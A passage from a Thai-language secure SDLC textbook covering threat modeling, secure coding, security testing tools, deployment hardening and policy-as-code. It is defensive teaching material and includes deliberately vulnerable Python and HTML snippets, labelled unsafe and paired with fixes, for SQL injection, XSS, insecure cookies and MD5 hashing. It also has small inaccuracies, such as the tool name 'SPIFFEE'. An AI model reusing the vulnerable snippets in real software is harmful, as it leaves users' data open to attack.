| ผู้ใช้โอนเงินให้ผู้อื่น | ผู้โจมตีพยายามโอนเงินจากบัญชีผู้อื่น |
| ผู้ใช้ดูประวัติการรักษาของตนเอง | ผู้โจมตีพยายามดูประวัติการรักษาของผู้อื่น (IDOR) |
| ผู้ใช้อัปโหลดรูปโปรไฟล์ | ผู้โจมตีอัปโหลดไฟล์ที่มี Malicious Code |

**ขั้นตอนการสร้าง Abuse Cases:**
1. ระบุ Asset ที่ต้องปกป้อง (ข้อมูล/ฟังก์ชันสำคัญ)
2. ระบุ Actor — ใครบ้างที่สามารถโต้ตอบกับระบบ (รวมถึง Attacker)
3. สร้าง Use Case ปกติ
4. สำหรับแต่ละ Use Case สร้าง Abuse Case — "จะเกิดอะไรขึ้นถ้า..."
5. วิเคราะห์และจัดลำดับความเสี่ยงของแต่ละ Abuse Case
6. กำหนด Security Requirements เพื่อป้องกัน Abuse Case

**3. Security Stories (เรื่องราวความปลอดภัย)**
ใน Agile Development, Security Requirements ถูกเขียนในรูปแบบของ User Story:

```
ในฐานะ [บทบาท]
ฉันต้องการ [ฟังก์ชัน/ความสามารถ]
เพื่อให้ [คุณค่าทางธุรกิจ/ความปลอดภัย]

--- Acceptance Criteria ---
- [เงื่อนไขที่ 1]
- [เงื่อนไขที่ 2]
```

**ตัวอย่าง Security Story:**
```
ในฐานะ ผู้ใช้ระบบ
ฉันต้องการให้รหัสผ่านของฉันถูกเข้ารหัสก่อนจัดเก็บ
เพื่อให้มั่นใจว่าข้อมูลรหัสผ่านของฉันปลอดภัยแม้ฐานข้อมูลถูกรั่วไหล

--- Acceptance Criteria ---
- รหัสผ่านถูก Hashing ด้วย Argon2id ก่อนจัดเก็บ
- ไม่มีการเก็บ Plaintext Password ใน Log หรือ Database
- กระบวนการ Hash ใช้ Salt ที่ไม่ซ้ำกันในแต่ละ Record
- การ Reset Password ต้อง Invalid Token ทันที
```

**4. Security Acceptance Criteria (เกณฑ์การยอมรับด้านความปลอดภัย)**
เพิ่มเงื่อนไขด้านความปลอดภัยในทุก User Story — ไม่จำเป็นต้องมี Security Story แยก:

**User Story: สมัครสมาชิกใหม่**
- ✅ ส่งอีเมลยืนยันก่อนเปิดใช้งาน (ป้องกัน Fake Account)
- ✅ ตรวจสอบความแข็งแกร่งของรหัสผ่าน (12+ chars, มีตัวเลขและสัญลักษณ์)
- ✅ ไม่เปิดเผยว่ารหัสผ่านผิดหรือ Username ไม่มี (ป้องกัน Enumeration)
- ✅ Rate Limit การส่ง OTP (ป้องกัน Brute Force)
- ✅ บันทึก Audit Log ทุกการสมัคร (Timestamp, IP, Email)

**เครื่องมือที่ใช้ใน Requirements Phase:**
| เครื่องมือ | วัตถุประสงค์ |
|-----------|-------------|
| OWASP ASVS (Application Security Verification Standard) | ใช้เป็น Checklist สำหรับ Security Requirements |
| OWASP SAMM | ประเมินวุฒิภาวะและกำหนด Roadmap |
| NIST SP 800-53 | ใช้เป็น Catalog ของ Security Controls |
| Microsoft SDL Requirements | Security Requirements Template จาก Microsoft |
| Jira / Azure DevOps / Trello | จัดการ Security Stories และ Acceptance Criteria |

**Output/Deliverables:**
- Security Requirements Specification
- Abuse Case Diagram
- Security Story Backlog
- Security Acceptance Criteria สำหรับทุก User Story
- Risk Assessment Report

---

#### 3.3.2 Design Phase (ขั้นตอนการออกแบบ)

**วัตถุประสงค์:** ออกแบบสถาปัตยกรรมและฟังก์ชันของระบบโดยคำนึงถึงความปลอดภัยตั้งแต่ต้น เพื่อป้องกันช่องโหว่ทางโครงสร้างก่อนเริ่มพัฒนา

**กิจกรรมหลัก:**

**1. Threat Modeling (การสร้างแบบจำลองภัยคุกคาม)**
Threat Modeling เป็นกระบวนการระบุ วิเคราะห์ และจัดลำดับความสำคัญของภัยคุกคามต่อระบบ โดยทั่วไปใช้กรอบ STRIDE (พัฒนาโดย Microsoft):

| ภัยคุกคาม | คำอธิบาย | ตัวอย่าง | มาตรการป้องกัน |
|-----------|----------|---------|---------------|
| **S**poofing | ปลอมแปลงตัวตน | แฮกเกอร์ปลอมเป็นผู้ใช้อื่น | Authentication, MFA, Certificate |
| **T**ampering | แก้ไขข้อมูล | แก้ไข Payload ระหว่างส่ง | Integrity Check, Digital Signature, HMAC |
| **R**epudiation | ปฏิเสธการกระทำ | ผู้ใช้บอกว่า "ไม่ได้ทำ" | Audit Log, Digital Signature, Non-repudiation |
| **I**nformation Disclosure | ข้อมูลรั่วไหล | SQL Injection อ่านข้อมูลจากฐานข้อมูล | Encryption, Access Control, Input Validation |
| **D**enial of Service | ปฏิเสธการให้บริการ | ส่ง Request จำนวนมากจนระบบล่ม | Rate Limiting, Auto Scaling, DDoS Protection |
| **E**levation of Privilege | ยกระดับสิทธิ์ | ผู้ใช้ทั่วไปกลายเป็น Admin | Authorization, Input Validation, Least Privilege |

**ขั้นตอนการทำ Threat Modeling (ตาม Microsoft SDL):**
1. **Decompose the System:** วาด Data Flow Diagram (DFD) แสดง Component, Data Store, Data Flow, Trust Boundary
2. **Identify Threats:** ใช้ STRIDE วิเคราะห์แต่ละ Component และ Data Flow
3. **Rank Threats:** ใช้ DREAD หรือ CAPEC ในการจัดลำดับความเสี่ยง
4. **Define Mitigations:** กำหนดมาตรการป้องกันสำหรับแต่ละภัยคุกคาม
5. **Document and Track:** บันทึก Threat Model และติดตามการแก้ไข

**เครื่องมือ Threat Modeling:**
| เครื่องมือ | รายละเอียด |
|-----------|-------------|
| Microsoft Threat Modeling Tool | ฟรี, ใช้ STRIDE, มี Template ของ Azure/AWS |
| OWASP Threat Dragon | Open Source, รองรับ STRIDE และ LINDDUN |
| IriusRisk | Commercial, รองรับ Threat Modeling Automation |
| Cairis | Open Source, Risk-Driven Threat Modeling |

**2. Secure Design Principles (หลักการออกแบบที่ปลอดภัย)**
ประยุกต์ใช้ 11 หลักการของ Saltzer & Schroeder (จากบทที่ 2) ในการออกแบบ:

| หลักการ | การประยุกต์ใช้ในการออกแบบ |
|---------|--------------------------|
| Economy of Mechanism | ออกแบบระบบให้เรียบง่าย — หลีกเลี่ยง Complexity ที่ไม่จำเป็น |
| Fail-Safe Defaults | Default Deny — ปิดทุกอย่างแล้วเปิดเฉพาะที่จำเป็น |
| Complete Mediation | ทุก API Call ต้องตรวจสอบ Authorization — ไม่ Cache สิทธิ์ |
| Least Privilege | แต่ละ Service/Component มีสิทธิ์เฉพาะที่จำเป็น |
| Separation of Privilege | แยก Admin Function, ต้องมี Multi-Party Approval |
| Least Common Mechanism | แยก Service/Container, ไม่ใช้ Shared Component ถ้าไม่จำเป็น |
| Defense in Depth | มีหลายชั้นป้องกัน — WAF, API Gateway, Service, Database |
| Open Design | ใช้มาตรฐานเปิด (OAuth 2.0, TLS 1.3), ไม่พึ่งพา Security Through Obscurity |

**3. Attack Surface Analysis (การวิเคราะห์พื้นผิวการโจมตี)**
Attack Surface = จุดทั้งหมดที่ผู้โจมตีสามารถเข้าถึงระบบได้ (Network Ports, API Endpoints, Files, User Inputs)

**การลด Attack Surface:**
| วิธีการ | ตัวอย่าง |
|---------|---------|
| ปิดบริการ/Port ที่ไม่จำเป็น | ปิด SSH จาก Internet, ปิด Debug Endpoint |
| จำกัดการเข้าถึง | IP Allowlist, VPN, Zero Trust Network |
| ใช้ Network Segmentation | แยก DMZ, Internal Network, Database Tier |
| ลดฟังก์ชันที่เปิดให้ผู้ใช้ | ปิดฟังก์ชันที่ยังไม่จำเป็น (Feature Flag) |
| ใช้ Input Validation | จำกัด Input Type, Size, Format |
| ใช้ API Gateway | ตรวจสอบ Request ทุกรายการก่อนถึง Service |

**4. Architecture Review (การทบทวนสถาปัตยกรรม)**
ทีม Security ตรวจสอบ Architecture Design ว่าปลอดภัยและสอดคล้องกับ Security Requirements:

- ตรวจสอบ Data Flow — ข้อมูลไหลอย่างไร, มี Encryption ที่ไหนบ้าง
- ตรวจสอบ Trust Boundary — จุดที่ Data ไหลจาก Trust Zone หนึ่งไปอีก Zone หนึ่ง
- ตรวจสอบ IAM Design — ใครเข้าถึงอะไรได้บ้าง
- ตรวจสอบ Network Security — การแบ่ง Network, Firewall Rule
- ตรวจสอบ Cryptography — Algorithm, Key Management
- ตรวจสอบ Third-Party Integration — API ภายนอก, Library

**เครื่องมือที่ใช้ใน Design Phase:**
| เครื่องมือ | วัตถุประสงค์ |
|-----------|-------------|
| Microsoft Threat Modeling Tool | สร้าง Threat Model |
| Draw.io / Lucidchart | วาด Architecture Diagram, DFD |
| OWASP Threat Dragon | Threat Modeling Open Source |
| SPIFFEE (Stride Per Element) | ใช้ STRIDE วิเคราะห์แต่ละ Element ใน DFD |
| Python / PlantUML | สร้าง Diagram ด้วย Code |

**Output/Deliverables:**
- Architecture Design Document (รวม Security Section)
- Data Flow Diagram (DFD) พร้อม Trust Boundary
- Threat Model Document (STRIDE per Element)
- Attack Surface Analysis Report
- Architecture Review Sign-off

---

#### 3.3.3 Implementation Phase (ขั้นตอนการพัฒนา)

**วัตถุประสงค์:** พัฒนาซอฟต์แวร์ตาม Design ที่กำหนด โดยใช้แนวปฏิบัติการเขียนโค้ดที่ปลอดภัย และตรวจสอบหาช่องโหว่ตั้งแต่ในขั้นตอนการพัฒนา

**กิจกรรมหลัก:**

**1. Secure Coding Standards (มาตรฐานการเขียนโค้ดที่ปลอดภัย)**
นักพัฒนาต้องปฏิบัติตามมาตรฐาน Secure Coding เพื่อป้องกันช่องโหว่ทั่วไป:

| มาตรฐาน | รายละเอียด | เหมาะกับ |
|---------|-----------|----------|
| **CERT Secure Coding Standards** | มาตรฐานจาก Carnegie Mellon University — ครอบคลุม C, C++, Java, Perl, Android | ภาษา C/C++, Java |
| **OWASP ASVS** | Application Security Verification Standard — ครอบคลุม Web Application ทั่วไป | Web App ทุกภาษา |
| **OWASP Top 10** | รายการช่องโหว่ 10 อันดับที่พบบ่อย | ทุกประเภท |
| **SEI CERT Oracle Coding Standard for Java** | ครอบคลุม Java Security | Java |
| **Microsoft SDL Banned Function Calls** | รายชื่อฟังก์ชันที่ห้ามใช้ | C/C++ |

**แนวปฏิบัติ Secure Coding ที่สำคัญ:**

**Input Validation:**
```python
# ไม่ปลอดภัย: รับ input โดยตรงโดยไม่ตรวจสอบ
user_input = request.GET.get('id')
query = f"SELECT * FROM users WHERE id = {user_input}"  # SQL Injection!

# ปลอดภัย: ใช้ Parameterized Query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

**Output Encoding:**
```html
<!-- ไม่ปลอดภัย: แสดง Output โดยตรง -->
<div>{{ user_comment }}</div>  <!-- XSS ถ้า comment มี <script> -->

<!-- ปลอดภัย: HTML Encode -->
<div>{{ user_comment|escape }}</div>
```

**Authentication & Session Management:**
```python
# ไม่ปลอดภัย: เก็บ Session Token ใน Cookie โดยไม่ secure
response.set_cookie('session_id', token)  # Man-in-the-Middle!

# ปลอดภัย: ใช้ HttpOnly + Secure + SameSite
response.set_cookie('session_id', token, httponly=True, secure=True, samesite='Lax')
```

**Cryptography:**
```python
# ไม่ปลอดภัย: ใช้ Algorithm ที่อ่อนแอ
hash = hashlib.md5(password.encode()).hexdigest()  # MD5 ถูก Crack แล้ว!

# ปลอดภัย: ใช้ Argon2id
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
```

**2. Static Application Security Testing (SAST)**
SAST เป็นการวิเคราะห์ Source Code, Bytecode, หรือ Binary โดยไม่ต้องรันโปรแกรม (White Box Testing) — เปรียบเสมือน "Grammar Checker" สำหรับช่องโหว่

**เครื่องมือ SAST:**

| เครื่องมือ | ประเภท | ภาษา | จุดเด่น |
|-----------|--------|------|---------|
| Semgrep | Open Source | Python, JS, Java, Go และอื่นๆ | กฎกำหนดเองได้, เร็ว, รองรับ CI/CD |
| SonarQube | Open Source + Commercial | 30+ ภาษา | Code Quality + Security, Community Edition ฟรี |
| CodeQL | Semi-Open | Python, JS, Java, C#, Go | Query-Based, GitHub Integration |
| Checkmarx | Commercial | 25+ ภาษา | Coverage สูง, CI/CD Integration |
| Fortify | Commercial | 27+ ภาษา | Enterprise Grade, Compliance Reporting |
| Bandit | Open Source | Python | เฉพาะ Python, ใช้งานง่าย |
| Brakeman | Open Source | Ruby on Rails | เฉพาะ Rails |
| SpotBugs + FindSecBugs | Open Source | Java | Android + Java |

**การบูรณาการ SAST ใน CI/CD:**
- ทำงานทุกครั้งที่มี Push/Pull Request
- "Fail the Build" เมื่อพบช่องโหว่ระดับ Critical/High
- สร้างรายงานและส่งไปยัง Developer
- กำหนด Baseline — ไม่ให้จำนวนช่องโหว่เพิ่มขึ้น

**3. Peer Code Review with Security Checklist (การตรวจสอบโค้ดโดยเพื่อนร่วมทีม)**
Code Review ทุกครั้งต้องมีมุมมองด้านความปลอดภัย — ใช้ Security Checklist:

**Security Code Review Checklist (ตัวอย่าง):**
- [ ] มี Input Validation สำหรับทุก Input ที่รับจากผู้ใช้หรือระบบภายนอกหรือไม่
- [ ] มี Output Encoding ก่อนแสดงข้อมูลใน HTML/JSON/XML หรือไม่
- [ ] ใช้ Parameterized Query / ORM แทน String Concatenation หรือไม่
- [ ] จัดการ Authentication อย่างถูกต้อง — ไม่ Hardcode Credential
- [ ] ตรวจสอบ Authorization ทุกครั้ง — ไม่ใช่แค่ตรวจที่ Frontend
- [ ] ใช้ Cryptography อย่างถูกต้อง — Algorithm ที่ปลอดภัย, Key Management
- [ ] จัดการ Error อย่างปลอดภัย — ไม่แสดง Stack Trace, ไม่เปิดเผยข้อมูลภายใน
- [ ] มี Rate Limiting / Throttling สำหรับ API ที่สำคัญ
- [ ] ไม่เปิด Debug/Test Code ใน Production
- [ ] Log เฉพาะข้อมูลที่จำเป็น — ไม่ Log Secrets (Password, Token, PII)

**เครื่องมือที่ใช้ใน Implementation Phase:**
| เครื่องมือ | วัตถุประสงค์ |
|-----------|-------------|
| Semgrep, SonarQube, CodeQL | SAST Scanning |
| GitLab CI/CD, GitHub Actions, Jenkins | CI/CD Pipeline |
| GitHub / GitLab / Bitbucket | Code Review Platform |
| OWASP ASVS Checklist | Security Requirements Verification |
| Dependency-Check, Trivy, Snyk | SCA (Software Composition Analysis) |

**Output/Deliverables:**
- Source Code ที่ผ่าน SAST Scan
- SAST Scan Report
- Code Review Log พร้อม Security Sign-off
- Dependency Vulnerability Report
- SBOM (Software Bill of Materials)

---

#### 3.3.4 Testing Phase (ขั้นตอนการทดสอบ)

**วัตถุประสงค์:** ทดสอบความปลอดภัยของซอฟต์แวร์ในสภาพแวดล้อมที่ใกล้เคียง Production เพื่อค้นหาช่องโหว่ที่อาจหลุดรอดจากขั้นตอนการพัฒนา

**กิจกรรมหลัก:**

**1. Dynamic Application Security Testing (DAST)**
DAST เป็นการทดสอบความปลอดภัยโดยรันโปรแกรมจริง (Black Box Testing) — ไม่ต้องมี Source Code — ทดสอบจากมุมมองของผู้โจมตี

| เครื่องมือ | ประเภท | จุดเด่น |
|-----------|--------|---------|
| OWASP ZAP | Open Source | ฟรี, Community Support, Automation Friendly |
| Burp Suite | Commercial (มี Community Edition) | Professional Edition มีฟีเจอร์มากมาย |
| Acunetix | Commercial | Web Application + Network Scanning |
| Netsparker | Commercial | False Positive น้อย (Proof-Based Scanning) |
| InsightAppSec | Commercial | CI/CD Integration, Cloud-Based |

**ตัวอย่างการใช้ OWASP ZAP ใน CI/CD:**
```yaml
# GitLab CI/CD — DAST Stage
dast:
  stage: test
  script:
    - docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable
      zap-baseline.py -t https://staging.example.com
      -r zap_report.html
  artifacts:
    paths:
      - zap_report.html
```

**2. Penetration Testing (การทดสอบเจาะระบบ)**
Pen Test เป็นการจำลองการโจมตีจริงเพื่อประเมินความปลอดภัยของระบบ มีหลายรูปแบบ:

| ประเภท | คำอธิบาย | ข้อดี | ข้อเสีย |
|--------|---------|------|---------|
| **Black Box** | ผู้ทดสอบไม่ทราบข้อมูลภายในระบบ | จำลองการโจมตีจากภายนอกสมจริง | อาจพลาดช่องโหว่ภายใน |
| **White Box** | ผู้ทดสอบทราบข้อมูลทั้งหมด (Source Code, Architecture) | ครอบคลุม, ประหยัดเวลา | อาจไม่สมจริง |
| **Grey Box** | ผู้ทดสอบทราบข้อมูลบางส่วน (เช่น Credential, API Doc) | สมดุลระหว่างความสมจริงและความครอบคลุม | — |
| **Red Team** | ทีมโจมตีจำลอง Advanced Persistent Threat (APT) | ทดสอบการตรวจจับและการตอบสนอง (Blue Team) | ใช้ทรัพยากรมาก |
| **Purple Team** | Red Team + Blue Team ทำงานร่วมกัน | เพิ่มประสิทธิภาพการป้องกันและตรวจจับ | ต้องการทีมที่มีประสบการณ์ |

**ขอบเขตของ Pen Test ควรครอบคลุม:**
- Web Application — OWASP Top 10
- API — REST, GraphQL, gRPC
- Mobile Application — iOS, Android
- Network — Internal, External
- Cloud Infrastructure — AWS/Azure/GCP
- Social Engineering — Phishing, Physical

**ข้อควรระวัง:**
⚠️ **การทำ Pen Test ต้องได้รับอนุญาตเป็นลายลักษณ์อักษรก่อนเสมอ** — การทดสอบโดยไม่ได้รับอนุญาตอาจผิดกฎหมาย (Computer Fraud and Abuse Act ในสหรัฐฯ, พ.ร.บ. ว่าด้วยการกระทำความผิดเกี่ยวกับคอมพิวเตอร์ พ.ศ. 2560 ในไทย)

**3. Fuzz Testing (การทดสอบแบบ Fuzz)**
Fuzz Testing (Fuzzing) เป็นการป้อนข้อมูลที่สุ่ม ไม่ถูกต้อง หรือไม่คาดคิดให้กับโปรแกรม เพื่อค้นหาช่องโหว่ที่เกิดจาก Input Validation ไม่ดี

| ประเภท Fuzzing | คำอธิบาย | เครื่องมือ |
|----------------|---------|-----------|
| **Dumb Fuzzing** | สุ่มข้อมูลโดยไม่รู้โครงสร้าง | zzuf, radamsa |
| **Smart Fuzzing** | สร้างข้อมูลตามโครงสร้าง (Grammar-Based) | AFL, libFuzzer |
| **Mutation Fuzzing** | เปลี่ยนแปลงข้อมูลที่มีอยู่ | Peach Fuzzer, Honggfuzz |
| **Generation Fuzzing** | สร้างข้อมูลจาก Template/Model | SPIKE, Sulley |

**ตัวอย่างการใช้งาน Fuzz Testing:**
- **API Fuzzing:** ส่ง HTTP Request ที่ผิดปกติ (Malformed JSON, SQL Injection Payload, XSS Payload)
- **File Fuzzing:** สร้างไฟล์ PDF/JPEG/XML ที่ผิดปกติเพื่อทดสอบ Parser
- **Network Protocol Fuzzing:** ส่ง Network Packet ที่ผิดปกติ
- **Browser Fuzzing:** ทดสอบ JavaScript Engine (ใช้ใน Browser Vendor)

**4. Software Composition Analysis (SCA) / Dependency Scanning**
SCA เป็นการวิเคราะห์ Third-Party Components (Library, Framework, Container) เพื่อค้นหาช่องโหว่ที่ทราบ (Known Vulnerabilities) และตรวจสอบ License Compliance

| เครื่องมือ | ประเภท | จุดเด่น |
|-----------|--------|---------|
| Trivy | Open Source | สแกน Container, Filesystem, Git Repo, Kubernetes |
| Snyk | Commercial (มี Free Tier) | Developer-Friendly, CI/CD Integration |
| OWASP Dependency-Check | Open Source | ใช้ NVD Database, Jenkins Plugin |
| GitHub Dependabot | ฟรีสำหรับ GitHub | Automatic PR เมื่อมี Dependency ที่ต้องอัปเดต |
| GitLab Dependency Scan | Built-in GitLab | ทำงานใน CI/CD Pipeline |
| Black Duck | Commercial | Enterprise, Compliance, License Management |

**Output/Deliverables:**
- DAST Scan Report
- Penetration Testing Report (Executive Summary + Technical Findings)
- Fuzz Testing Report
- SCA Report — รายการ Dependency และ Known Vulnerabilities
- Risk Assessment (Severity, Exploitability, Impact)

---

#### 3.3.5 Deployment Phase (ขั้นตอนการปรับใช้)

**วัตถุประสงค์:** กำหนดค่าและสภาพแวดล้อมการทำงานให้ปลอดภัยก่อนนำซอฟต์แวร์ขึ้น Production

**กิจกรรมหลัก:**

**1. Security Configuration Review (การตรวจสอบการกำหนดค่าความปลอดภัย)**
ตรวจสอบการ Config Production Environment ว่าปลอดภัยตามมาตรฐาน:

| หัวข้อ | รายการตรวจสอบ |
|-------|--------------|
| **Web Server** | ปิด Directory Listing, ปิด Server Version Banner, ตั้ง HSTS Header, Content Security Policy |
| **Database** | ใช้ Non-Root User, ปิด Public Access, เปิด Encryption at Rest, ตั้ง Firewall Rule |
| **Cloud Services** | ตรวจสอบ IAM Policy, S3 Bucket Permission, Security Group, Network ACL |
| **Container** | ไม่รันด้วย Root, ใช้ Read-Only Filesystem, ไม่มี Privileged Mode |
| **TLS/SSL** | ใช้ TLS 1.3, ปิด TLS 1.0/1.1, ตั้ง HSTS, ตรวจสอบ Certificate ไม่หมดอายุ |

**2. Infrastructure Scanning (การสแกนโครงสร้างพื้นฐาน)**
ตรวจสอบ Infrastructure Config ว่ามีช่องโหว่หรือ Misconfiguration หรือไม่:

| เครื่องมือ | ประเภท | วัตถุประสงค์ |
|-----------|--------|-------------|
| ScoutSuite | Open Source | สแกน AWS/Azure/GCP Security Configuration |
| Prowler | Open Source | AWS Security Assessment (CIS Benchmark) |
| CloudSploit | Open Source | Cloud Security Scanning |
| AWS Security Hub | AWS Native | Centralized Security Findings |
| Azure Security Center | Azure Native | Security Posture Management |
| GCP Security Command Center | GCP Native | Threat Detection + Vulnerability Scanning |

**3. Container Image Scanning (การสแกน Container Image)**
ก่อน Deploy Container Image ขึ้น Production ต้องสแกนหา:
- Known Vulnerabilities ใน Base Image และ Package
- Misconfiguration (เช่น รันด้วย Root, มี SSH)
- Embedded Secrets (API Key, Password)
- Malware

| เครื่องมือ | จุดเด่น |
|-----------|---------|
| Trivy | ฟรี, สแกน OS Package + Language Package, เร็ว |
| Docker Scout | Built-in ใน Docker Desktop, แสดง Dependency Tree |
| Anchore | Open Source Policy Engine สำหรับ Container |
| Clair | Open Source (จาก Red Hat), Static Analysis |
| Sysdig Secure | Runtime + Image Scanning |
| Aqua Security | Enterprise Container Security |

**Output/Deliverables:**
- Security Configuration Checklist (Signed-off)
- Infrastructure Scan Report
- Container Image Scan Report
- Deployment Checklist Sign-off
- Production Ready Certificate

---

#### 3.3.6 Operations Phase (ขั้นตอนการดำเนินงาน)

**วัตถุประสงค์:** รักษาความปลอดภัยของระบบขณะทำงานใน Production ตรวจจับและตอบสนองต่อภัยคุกคาม

**กิจกรรมหลัก:**

**1. Incident Response Plan (แผนตอบสนองต่อเหตุการณ์)**
แผนรับมือเมื่อมีเหตุการณ์ด้านความปลอดภัย — ตามกรอบ NIST SP 800-61 (Computer Security Incident Handling Guide):

| ขั้นตอน | กิจกรรม |
|---------|---------|
| **Preparation** | เตรียมทีม IR, เครื่องมือ, Playbook, สื่อสาร |
| **Detection & Analysis** | ตรวจจับ วิเคราะห์ และยืนยัน Incident |
| **Containment, Eradication & Recovery** | ควบคุมสถานการณ์ กำจัดสาเหตุ และกู้คืนระบบ |
| **Post-Incident Activity** | วิเคราะห์ Root Cause, Lesson Learned, ปรับปรุง |

**2. Patch Management (การจัดการ Patch)**
กระบวนการติดตั้ง Security Patch อย่างเป็นระบบ:

| ระดับความรุนแรง | ระยะเวลาเป้าหมาย | ตัวอย่าง |
|----------------|-----------------|---------|
| **Critical (Remote Code Execution)** | ≤ 48 ชั่วโมง | Log4Shell (CVE-2021-44228) |
| **High (Privilege Escalation)** | ≤ 7 วัน | ProxyShell |
| **Medium (Information Disclosure)** | ≤ 30 วัน | SSL/TLS Vulnerabilities |
| **Low** | ≤ 90 วัน | Minor Configuration Issues |

**ขั้นตอน Patch Management:**
1. **Identify:** รับแจ้งช่องโหว่ (Vendor Advisory, CVE, CISA KEV)
2. **Assess:** ประเมินความเสี่ยงต่อระบบขององค์กร
3. **Test:** ทดสอบ Patch ใน Staging Environment
4. **Deploy:** ติดตั้ง Patch ใน Production (ตาม Change Management)
5. **Verify:** ตรวจสอบว่า Patch ทำงานถูกต้อง
6. **Report:** บันทึกการ Patch

**3. Vulnerability Management Lifecycle (วงจรการจัดการช่องโหว่)**
กระบวนการต่อเนื่องในการค้นหา ประเมิน และแก้ไขช่องโหว่:

```
Discover → Prioritize → Remediate → Verify → Report
   ↑                                        |
   └────────────────────────────────────────┘
```

| ขั้นตอน | รายละเอียด |
|---------|-----------|
| **Discover** | Scan Infrastructure และ Application อย่างสม่ำเสมอ |
| **Prioritize** | จัดลำดับตาม CVSS, EPSS, Business Impact, Asset Criticality |
| **Remediate** | Patch, Configuration Change, Compensating Control |
| **Verify** | Re-scan ยืนยันว่าช่องโหว่ถูกแก้ไข |
| **Report** | รายงานสถานะให้ผู้บริหารและ Stakeholder |

**4. Continuous Monitoring (การเฝ้าระวังอย่างต่อเนื่อง)**
ใช้เครื่องมือในการเฝ้าระวังและตรวจจับภัยคุกคามแบบ Real-time:

| เครื่องมือ | วัตถุประสงค์ |
|-----------|-------------|
| **SIEM** (Splunk, ELK, Azure Sentinel) | รวบรวมและวิเคราะห์ Log จากทุกแหล่ง |
| **EDR** (CrowdStrike, SentinelOne, Defender for Endpoint) | ตรวจจับ Malware บน Endpoint |
| **IDS/IPS** (Snort, Suricata) | ตรวจจับและป้องกัน Network Attack |
| **WAF** (Cloudflare, AWS WAF, ModSecurity) | ป้องกัน Web Application Attack |
| **Cloud Security Posture Management** (AWS Security Hub, Azure Defender) | ตรวจจับ Cloud Misconfiguration |
| **Runtime Protection** (Falco, AppArmor, Seccomp) | ตรวจจับพฤติกรรมผิดปกติใน Container |

**Output/Deliverables:**
- Incident Response Plan Document
- Patch Management Policy
- Vulnerability Management Report (Monthly/Quarterly)
- Security Monitoring Dashboard
- Post-Incident Review Document

---

### 3.4 DevSecOps และ CI/CD Security

DevSecOps คือการบูรณาการความปลอดภัย (Security) เข้าไปในกระบวนการ DevOps — ทำให้ความปลอดภัยเป็นส่วนหนึ่งของ Pipeline การพัฒนาตั้งแต่ Commit ถึง Production ไม่ใช่สิ่งที่มา "ตรวจทีหลัง"

#### 3.4.1 Security as Code (การกำหนดความปลอดภัยเป็นโค้ด)

Security as Code คือแนวคิดในการเขียน Security Controls ในรูปแบบของ Code ที่ Version Control ได้ ทดสอบอัตโนมัติได้ และ Deploy ได้ผ่าน CI/CD Pipeline

**หลักการสำคัญ:**
1. **Version Controlled:** Security Policy ถูกเก็บใน Git เช่นเดียวกับ Source Code
2. **Automated:** ทุกอย่างรันอัตโนมัติ — ไม่มี Manual Step
3. **Testable:** Security Policy สามารถทดสอบได้ใน CI/CD
4. **Repeatable:** ผลลัพธ์สม่ำเสมอ — ไม่แตกต่างกันในแต่ละครั้ง
5. **Auditable:** ทุกการเปลี่ยนแปลง Security Policy มี History ใน Git

**องค์ประกอบของ Security as Code:**

| องค์ประกอบ | คำอธิบาย |
|-----------|----------|
| **Policy as Code** | เขียน Policy ในรูปแบบ Code — OPA, Sentinel |
| **Compliance as Code** | ตรวจสอบ Compliance โดยอัตโนมัติ — InSpec, Cloud Custodian |
| **Infrastructure as Code Security** | สแกน IaC (Terraform, CloudFormation) ก่อน Deploy — Checkov, tfsec |
| **Pipeline Security** | SAST, DAST, SCA ในรูปแบบ Step ของ Pipeline |
| **Configuration as Code Security** | ตรวจสอบ Config — Kube-bench สำหรับ Kubernetes |

#### 3.4.2 Policy as Code (การกำหนดนโยบายเป็นโค้ด)

Policy as Code คือแนวทางในการเขียนนโยบาย (Policy) ในรูปแบบของรหัส (Code) ที่สามารถตรวจสอบได้โดยอัตโนมัติ เครื่องมือหลัก:

**Open Policy Agent (OPA):**
- Open Source Policy Engine ที่ได้รับ Graduation จาก CNCF ในปี 2021
- ใช้ภาษา Rego ในการเขียน Policy
- OPA 1.0 เผยแพร่ในเดือนธันวาคม 2024
- สามารถใช้กับ Kubernetes, Terraform, API Gateway, CI/CD

**ตัวอย่าง Rego Policy:**
```rego
package terraform.aws

# ห้ามเปิด Port 22 (SSH) สู่ Internet (0.0.0.0/0)
deny[msg] {
  resource := input.resource.aws_security_group_rule[_]
  resource.type == "ingress"
  resource.cidr_blocks[_] == "0.0.0.0/0"
  resource.from_port == 22
  msg := sprintf("Security group rule %v opens SSH to the internet", [resource.name])
}
```

**HashiCorp Sentinel:**
- Policy as Code Framework จาก HashiCorp
- ใช้กับ Terraform Enterprise, Vault, Consul
- ภาษา Sentinel (Declarative Language)
- **ข้อเสีย:** จำกัดเฉพาะ HashiCorp Ecosystem

| เปรียบเทียบ OPA vs Sentinel | OPA | Sentinel |
|------------------------------|-----|----------|
| การพัฒนา | Open Source (CNCF) | HashiCorp |
| ภาษา | Rego | Sentinel |
| การใช้งาน | Kubernetes, Terraform, API, CI/CD | Terraform, Vault, Consul |
| License | Apache 2.0 | Business Source License |
| ชุมชน | 450+ Contributors, OPA 1.0 (2024) | HashiCorp Ecosystem |

#### 3.4.3 Compliance as Code (การปฏิบัติตามกฎระเบียบเป็นโค้ด)

Compliance as Code คือการตรวจสอบ Compliance (PDPA, GDPR, PCI DSS, HIPAA) โดยอัตโนมัติใน CI/CD Pipeline

**InSpec (Chef):**
- Open Source Framework สำหรับกำหนด Compliance Test ในรูปแบบ Code
- รองรับการทดสอบ Infrastructure, Application, และ Cloud APIs

**ตัวอย่าง InSpec Profile:**
```ruby
control 'cis-1.1' do
  impact 1.0
  title 'Ensure IAM policies are not overly permissive'
  desc 'IAM policy should not allow full "*:*" access'
  
  describe aws_iam_policy('AdministratorAccess') do
    it { should_not be_attached }
  end
end
```

**Cloud Custodian:**
- Tool สำหรับจัดการ Cloud Resources ให้สอดคล้องกับ Policy
- สามารถ Detect, Tag, และ Remediate Resources โดยอัตโนมัติ

**ตัวอย่าง Cloud Custodian Policy:**
```yaml
policies:
  - name: unencrypted-s3-bucket
    resource: s3
    filters:
      - type: bucket-encryption
        state: false
    actions:
      - type: notify
        subject: "S3 Bucket ไม่มีการเข้ารหัส!"
        to:
          - security-team@company.com
```

